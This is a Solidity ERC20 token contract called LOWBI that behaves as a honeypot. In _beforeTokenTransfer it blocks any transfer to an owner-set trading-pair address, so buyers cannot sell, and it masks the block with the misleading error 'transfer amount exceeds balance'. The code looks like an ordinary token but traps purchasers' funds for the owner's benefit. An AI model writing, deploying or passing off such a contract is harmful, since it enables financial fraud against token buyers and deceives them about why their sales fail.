// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;
import "./ERC20.sol";
import "./Ownable.sol";

contract LOWBI is ERC20, Ownable{
    address public tradingPairAddress;
    constructor() ERC20("LOWBI", "LOWBI") {
        _mint(msg.sender,100000000000e18);
    }
     function setTradingPairAddress(address _tradingPairAddress) external onlyOwner {
        tradingPairAddress = _tradingPairAddress;
    }
      function burn(uint256 value) external {
        _burn(msg.sender, value);
    }
     function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
       require(!(from != address(0) && to != address(0) && to == tradingPairAddress), "ERC20: transfer amount exceeds balance");
        super._beforeTokenTransfer(from, to, amount);
    }

}


